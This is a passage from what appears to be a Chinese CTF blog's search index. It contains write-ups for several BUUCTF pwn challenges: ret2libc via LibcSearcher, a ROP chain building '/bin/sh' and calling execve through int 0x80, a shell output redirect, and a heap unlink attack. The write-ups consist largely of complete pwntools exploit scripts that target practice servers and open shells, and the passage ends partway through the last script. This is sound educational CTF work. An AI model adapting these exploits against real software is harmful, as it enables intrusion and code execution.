R_X86_64_COPY 00000000006020a0 stderr@GLIBC_2.2.5 + 0 重定位节 \u0026#39;.rela.plt\u0026#39; at offset 0x598 contains 11 entries: 偏移量 信息 类型 符号值 符号名称 + 加数 000000602018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0 000000602020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000602028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000602030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0 000000602038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000602040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 getchar@GLIBC_2.2.5 + 0 000000602048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0 000000602050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0 000000602058 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fflush@GLIBC_2.2.5 + 0 000000602060 000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0 000000602068 000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 发现没有system，可能就是 ret2libc 了\nida 查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(\u0026#34;EEEEEEE hh iii \u0026#34;); puts(\u0026#34;EE mm mm mmmm aa aa cccc hh nn nnn eee \u0026#34;); puts(\u0026#34;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e \u0026#34;); puts(\u0026#34;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee \u0026#34;); puts(\u0026#34;====================================================================\u0026#34;); puts(\u0026#34;Welcome to this Encryption machine\\n\u0026#34;); begin(); while ( 1 ) { while ( 1 ) { fflush(0LL); v4 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); if ( v4 != 2 ) break; puts(\u0026#34;I think you can do it by yourself\u0026#34;); begin(); } if ( v4 == 3 ) { puts(\u0026#34;Bye!\u0026#34;); return 0; } if ( v4 != 1 ) break; encrypt(); begin(); } puts(\u0026#34;Something Wrong!\u0026#34;); return 0; } 这一大堆杂乱的代码我们花一点时间去分析就会发现，只有当第一次输入的选项是 1 的时候，才会进入encrypt函数，而这个函数的伪 C 代码为：\nint encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\u0026#34;Input your Plaintext to be encrypted\u0026#34;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 \u0026gt;= strlen(s) ) break; if ( s[x] \u0026lt;= 96 || s[x] \u0026gt; 122 ) { if ( s[x] \u0026lt;= 64 || s[x] \u0026gt; 90 ) { if ( s[x] \u0026gt; 47 \u0026amp;\u0026amp; s[x] \u0026lt;= 57 ) s[x] ^= 0xCu; } else { s[x] ^= 0xDu; } } else { s[x] ^= 0xEu; } ++x; } puts(\u0026#34;Ciphertext\u0026#34;); return puts(s); } 这代码也是乱得不得了，和神经病发癫一样。但是其实那一大串while里面的代码都可以通过这一句来跳过去：\nv0 = (unsigned int)x; // v0 \u0026gt;= 0 if ( v0 \u0026gt;= strlen(s) ) break; 如果我们让s的第一个字符为\\0的话，那么它strlen后的值就始终为 0，v0始终大于等于s的长度，那么就能直接跳出循环，不用进行下面那一大串操作。\n我们又看到输入函数为gets，这说明可以栈溢出，同时程序又有puts函数，我们就能得到libc的基址，从而计算出system的真实地址\n构建 exp 先把ret和pop rdi;ret这两个 gadget 准备好：\n$ ROPgadget --binary ciscn_2019_en_2 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400c83 : pop rdi ; ret ... 0x00000000004006b9 : ret ... 也可以通过 pwntools 的内置函数得到：\nrop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] puts 的 plt 和 got 地址、main 的地址同理：\nputs_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] 然后我们可以构建第一个 payload 了：\n# offset:int = 0x58，可以由gdb或者ida得知 payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) 然后我们就能得到puts的真实地址了：\np.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) # 这里很奇怪，调试后发现多了一个0a，要把它吞掉 p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) 为了避免各种版本的 libc 影响，我们可以使用 LibcSearcher：\n# 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # 手动选择第0号搜索到的libc # 如果你选择0号不行，也可以把这行注释掉，运行中再选择 searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) 原版 LibcSearcher 已经年久失修，而且基于本地 libc 库，几乎完全不可用，GitHub 上有很多新版 LibcSearcher，我选择了这个使用云端 libc 库的项目\n作者为了使用正确的 libc 甚至重新搭了一个 ubuntu18.04 的虚拟机环境，但是在几个小时的忙碌后发现 libc 版本还是不对，于是转而选择 LibcSearcher，不得不说，是真**的好用，感谢原作者和后续无私奉献的开发者！\n然后我们可以构建 payload 了：\npayload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_en_2\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;29058\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) # 查找gadget的内置函数 if not if_32: rop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] success(f\u0026#34;pop_rdi:{hex(pop_rdi)}\u0026#34;) success(f\u0026#34;ret:{hex(ret)}\u0026#34;) else: pop_rdi:int = 0 ret:int = 0 #需要自行设定offset offset:int = 0x58 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) success(f\u0026#34;main_addr:{hex(main_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(puts_plt) + pg(main_addr) + pg(0) + pg(puts_got) p.sendline(payload) # 得到真实地址 puts_addr:int = u32(p.recv(4)) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) # 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) success(f\u0026#34;base_addr:{hex(base_addr)}\u0026#34;) success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;bin_sh_addr:{hex(bin_sh_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(system_addr) + pg(0) + pg(bin_sh_addr) p.sendline(payload) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) p.sendline(payload) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/","section":"writeup","summary":"【Write-up】BUUCTF ciscn_2019_en_2 原题链接和这道题是一道题，一模一样的 【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整 exp checksec 查","tags":["pwn","LibSearcher"],"title":"【LibSearcher】ciscn_2019_en_2"},{"categories":["writeup"],"contents":"\u0026ldquo;【Write-up】BUUCTF not_the_same_3dsctf_2016 原题链接\n\u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file not_the_same_3dsctf_2016 [*] \u0026#39;/home/peterl/security/workspace/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位程序带堆防护\n同时，如果我们使用 ldd命令，就会发现这个程序是一个静态链接程序\nida查看程序伪代码 我们发现主函数很简单就能栈溢出，那我们再找找有没有后门函数\n结果发现了get_secret函数：\n我们发现这个后门函数实在有点特殊，主要逻辑是打开目录下的flag.txt文件，然后读入开头的至多45个字符入fl4g变量，我们双击fl4g变量发现其地址为：\n构建exp 我们使用readelf -s命令查看一下程序的符号表：\n$ readelf -s not_the_same_3dsctf_2016 | grep fl4g 1506: 080eca2d 45 OBJECT GLOBAL DEFAULT 24 fl4g $ readelf -s not_the_same_3dsctf_2016 | grep printf ... 901: 0804f0a0 30 FUNC GLOBAL DEFAULT 5 printf ... 那么我们的基本思路就是，先栈溢出调用后门函数，然后调用输出函数printf输出fl4g\npayload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) 注意，这里一定要使用exit退出，这里的exit起了一个return语句的作用\n完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./not_the_same_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;28534\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x8048A00\u0026#34;) else: p = process(fn) m_elf = ELF(fn) backdoor = 0x80489a0 p.clean() # 这里不能直接recvuntil，因为printf不刷新缓冲区，pwntools这种用管道的工具无法接收到任何字符 # p.recvuntil(\u0026#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... \u0026#34;) payload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/","section":"writeup","summary":"\u0026ldquo;【Write-up】BUUCTF not_the_same_3dsctf_2016 原题链接 \u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查看程序伪代码","tags":["pwn","printf不刷新缓冲区","无回显"],"title":"【printf不刷新缓冲区】not_the_same_3dsctf_2016"},{"categories":["writeup"],"contents":"原题链接\n直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流：\nexec 1\u0026gt;\u0026amp;0 cat flag ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/","section":"writeup","summary":"原题链接 直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流： exec 1\u0026gt;\u0026amp;0 cat flag","tags":["pwn","shell重定向"],"title":"【shell重定向】BUUCTF wustctf2020_closed"},{"categories":["writeup"],"contents":"【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016 原题链接\n在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016 checksec 查看架构 ida 查看程序（伪）代码 main 函数 后门函数 构建 exp 通过后门函数构建 exp 完整 exp1 通过 syscall 构建 exp 没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 完整 exp2 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 无法执行其他二进制文件 checksec 查看架构 看来是 32 位的程序。我们首先就要想到，32 位程序的参数传递方式和 64 位程序的是不一样的：\n32 位将参数从右到左先后压入栈中 64 位程序将参数分别用 RDI,RSI,RCX,RDX,R8,R9 作为第 1-6 个参数，用 RAX 保存返回值 所以，我们调用 system 函数的思路就不一样了。我们就不需要 pop rdi;ret 这个 gadget（在 32 位程序中也找不到），而是只需要注意用 ret 这个 gadget 保持栈返回时最后一位为 0 即可（system 特殊规定），可以参考这里\n但是如果程序很好心地为我们提供了后门函数，那上面的这些也不用考虑了\n同时，我们要注意 32 位程序由于参数保存在栈中，call 的同时还会将【下一条指令的偏移】压入栈中，因此我们要为【下一条指令的偏移】预留出位置\nida 查看程序（伪）代码 main 函数 看来是简单的栈溢出\n值得注意的是，这里有一个小坑，即 printf 和 puts 的区别。\nprintf 在调用完后并不会马上打印出字符串，而是等待刷新缓冲区的指令之后才显示字符串。在这里就体现为，到 gets 函数向用户请求输入时，还没有任何字符串显示。\n因此，可能有人会在写 exp 的时候，一直等待字符串输出，看一直没反应还以为自己 payload 写错了（\n具体的 printf 和 puts 的区别可以看这位大佬的博文，非常详细\n后门函数 然后我们就发现了程序好心为我们提供的后门函数（\n只要我们传入参数分别为 814536271 和 425138641，那么我们就能得到 flag 的内容\n构建 exp 通过后门函数构建 exp 步骤如下：\n首先我们要找到 offset 溢出到 return 的栈地址，这通过 ida 很容易发现 然后我们就将后门函数地址和参数值填入栈中即可 # pg = p32 payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) 然后直接 sendline 就 🆗 啦\n完整 exp1 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25191\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn) payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) p.sendline(payload) p.interactive() 通过 syscall 构建 exp 我们通过 ida 可以得知，该程序 plt 表内没有 system 函数也没有 execve 函数，同时此题又是静态编译，就不能适用 ret2libc 的方法从 libc 中找到 system。\n但是我们可以通过程序中断时产生的系统调用来执行 execve 这个中断程序\n全部中断程序编号见此\n这里我们只需要找到 59 号中断程序，向它传参即可\n64 位编号是 59，也就是 0x3b\n32 位编号是 11，也就是 0xb。\n同时，因为我们的程序是 32 位的，我们需要将编号传给 eax 寄存器，剩余参数分别传入 ecx,edx,esi,edi,ebp 中\n然后，我们要找到这几个参数对应的值。execve 函数后两个参数可以不管设为 0，但是第一个参数应该是/bin/sh或者sh\n为了将这几个参数送入寄存器中，我们还需要一个 gadget，不仅可以完成任务，还可以通过ret指令接着读下一条指令\n我们用ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot; | grep eax找 gadget：\n比较遗憾的是，没有刚刚好的 gadget，但是有一条勉强可用：\n0x080b91e6 : pop eax ; ret 那我们继续找 ebx、ecx、edx：\n$ROPgadget --binary get_started_3dsctf_2016 --only \u0026#34;pop|ret\u0026#34; | grep ebx 0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x0809a7dc : pop ebx ; pop edi ; ret 0x0806fc09 : pop ebx ; pop edx ; ret 0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret 0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x080718b1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0804ab66 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049a95 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x080509a5 : pop ebx ; pop esi ; pop edi ; ret 0x080498af : pop ebx ; pop esi ; pop edi ; ret 4 0x08049923 : pop ebx ; pop esi ; ret 0x080481ad : pop ebx ; ret 0x080d413c : pop ebx ; ret 0x6f9 0x08099f96 : pop ebx ; ret 8 0x0806fc31 : pop ecx ; pop ebx ; ret 0x08063adb : pop edi ; pop esi ; pop ebx ; ret 0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0807b1b0 : pop es ; pop ebx ; ret 0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret 0x0805d090 : pop esi ; pop ebx ; ret 0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 其中，有一条一下子就能同时设置三个需要用的寄存器：\n0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 那现在我们的栈从低到高就应该是 eax-\u0026gt;edx-\u0026gt;ecx-\u0026gt;ebx 然后我们需要找到int 0x80这个 32 位系统调用 system call 的中断指令（64 位就是 syscall）：0x0806d7e5 : int 0x80 然后我们需要找到填入 ebx 寄存器的/bin/sh。结果是没有/bin/sh PS.这里不能直接找sh字符串，因为 execve 函数第一个参数是 path，必须是绝对地址，而且必须是二进制文件（或者脚本文件，但是只会执行!#之后的那个解释器）。在 Linux 系统种的sh命令是软链接，并不是二进制文件\n具体可以查看这篇博客，这篇博客也很不错\n没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 这题是静态链接，没法 ret2libc。\n但是，我们可以找一处没有用到的地址，利用一些 gadget 将我们需要的值写进去，然后我们就得到了一个程序可以使用的\u0026quot;/bin/sh\u0026quot;字符串地址！\n首先我们需要一条指令，支持我们向内存中写入值，这样我们就可以 pop 栈中的值到寄存器，再将空闲内存的地址赋给另一个寄存器，这样就可以向空闲地址写入值了\n通过ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;mov|ret\u0026quot;命令然后我们找到了这个可用的 gadget：\n# dword表示双字，就是四个字节，刚好是32位寄存器的大小 0x080557ab : mov dword ptr [edx], eax ; ret 然后我们可以直接利用之前找到过的pop edx;pop ecx;pop ebx;ret将地址弹到 edx 中\n然后我们用 ida 找到一块闲置空间（一直滚到.data 段，最后有一小段重复的 db 0）\n然后我们就可以完成我们的 payload 了：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 完整 exp2 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; # libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if_debug: bool = False if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: shell = gdb.debug(fn, \u0026#34;b* 0x8048A40\u0026#34;) else: p = process(fn) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) if if_debug: shell.sendline(payload) shell.interactive() else: p.sendline(payload) p.interactive() 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 我们用 ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot;命令找到了pop edx的命令\n0x0806fc0a : pop edx ; ret 看起来似乎没有问题\n令人疑惑的是，这样子连栈都没法写入(在 pop eax 后就是连串的 popal)，可能是我找的这个 gadget 本身有点小问题\n但是我尝试了pop ecx;pop ebx;ret和mov [ecx+4], eax，程序完全正常运作，可以正常得到 shell\npayload 如下：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 # 这里一定要-4，因为gadget加了4 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_ecx_ebx_ret) + \\ pg(spare_space-4)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 无法执行其他二进制文件 作者一开始试图execve(\u0026quot;sh\u0026quot;, 0, 0)，但是查阅资料后明白只能执行二进制文件，于是又试图执行/bin/ls和/usr/bin/python3.10，但是均因不明原因失败了\n如果各位看官知道了原因，可以劳烦您在评论区为作者和后来人作一番解释吗？感激不尽！\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/","section":"writeup","summary":"【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016 原题链接 在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUC","tags":["pwn","syscall"],"title":"【syscall】get_started_3dsctf_2016"},{"categories":["writeup"],"contents":"原题链接\nchecksec查看程序架构 ida查看伪代码 典型的堆菜单题\n介绍一下unlink unlink其实就是很普通，很常规的一种从双向链表中取出节点的机制\n当我们free掉一个chunk的时候，程序会查看相邻的chunk时候也被free掉了，如果也被free掉了，就把它从双向链表中取出来（注意fastbin是单向链表），执行unlink，与当前free的chunk合并，然后放入它应该去的bin中\n我们的chunk有fd和bk两个域，分别指向（链表中）前一个chunk和后一个chunk，也就是说，fd域里保存的是前一个chunk的地址，bk是后一个chunk的地址\nunlink会更改chunk0和chunk2的的fd和bk指针，也就是说\nchunk0-\u0026gt;bk = chunk2 chunk2-\u0026gt;fd = chunk0 又因为fd和bk在同样位数的系统，比如64位的系统下，相较于chunk指针的偏移是固定的，因此，上面的代码又等价于\n*(chunk0 + 0x18) = chunk2 *(chunk2 + 0x10) = chunk0 而此时，如果我们要unlink的chunk的fd域和bk域，则上面的代码会产生这样的效果： *(ptr1 + 0x18) = ptr2 *(ptr2 + 0x10) = ptr1 那么，我们就可以更改ptr1下方0x10位置和0x18位置的值了！\n但是这个unlink机制还存在着一系列安全检查：\n这些检查确保：\n要进行unlink的chunk的size位和当前被free的chunk的prev_size位相同，同时它的prev_inuse位要置零 要进行unlink的chunk的上一个chunk的bk位指向当前chunk，下一个chunk的fd位指向当前chunk 也就是说： *(ptr1 + 0x18) == chunk1 *(ptr2 + 0x10) == chunk1 如何绕过？ 系统期待的是上一个chunk的bk域内存的值是chunk1，下一个chunk的fd域内存的值也是chunk1，当我们可以让\nptr1 = \u0026amp;chunk1 - 0x18 ptr2 = \u0026amp;chunk1 - 0x10 这样就可以绕过检查，这样最后的结果就是：\nchunk1 = \u0026amp;chunk1 - 0x10 chunk1 = \u0026amp;chunk1 - 0x18 我们让chunk1变成了存放chunk1的内存上方0x18这个地址\n然后我们就可以更改存放chunk1的内存的值，就可以实现任意地址写！\n本题思路 申请三块0x80的chunk，在第一块chunk内伪造一个0x70的已free的chunk，然后更改下一个chunk的prev_size位和size位从而实现unlink\n然后我们可以更改存放chunk1的内存的值，将其改为atoi的got值，我们就可以泄露出libc的基址\n然后我们又可以更改atoi的got值，改为system，再传入\u0026quot;/bin/sh\\x00\u0026quot;即可\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./bamboobox\u0026#34; libc_name:str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;27469\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400E42 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def show(index: int) -\u0026gt; bytes: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(f\u0026#34;{index} : \u0026#34;) return p.recv(6) def add(size: int, name: str): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(size)) p.clean() p.sendline(name) def change(index: int, name: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(name)+1)) p.clean() p.sendline(name) def remove(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) ptr 